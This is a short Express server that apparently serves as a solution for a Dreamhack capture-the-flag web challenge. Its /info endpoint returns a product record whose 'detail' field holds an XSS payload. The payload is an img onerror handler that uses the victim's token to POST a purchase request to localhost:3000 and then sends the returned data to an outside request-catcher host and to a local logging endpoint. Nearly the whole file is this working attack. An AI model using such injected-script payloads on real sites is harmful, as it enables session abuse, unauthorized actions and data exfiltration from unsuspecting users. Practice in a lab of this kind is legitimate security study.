const express = require('express');
const app = express();
const cors = require('cors');
const { redirect } = require('next/dist/server/api-utils');

app.use(cors());

const url = "http://localhost:3000";

app.use(express.json());

app.get('/info', (req, res) => {
    const token = req.headers['token'];

    const items = {
        "id": 1,
        "name": "Web Hacking 강의",
        "price": 1024,
        "detail": `
        <img src='' onerror='
        fetch("${url}/4/buy", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "token": "${token}"
            }
        })
        .then(response => response.json())
        .then(data => {
            fetch("https://hwbusxt.request.dreamhack.games/"+data.data)
            console.log(data.data)
            fetch("http://localhost:4000/log", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ message: data.data })
            });
        })
        '>
        `,
        "poster": ""
    }

    if (items) {
        res.send(items);
    } else {
        res.status(403).send('');
    }
});

app.post('/log', (req, res) => {
    console.log("Received from client:", req.body.message);
    res.sendStatus(200);
});

app.listen(4000, () => {
    console.log("Server is running on port 4000");
});
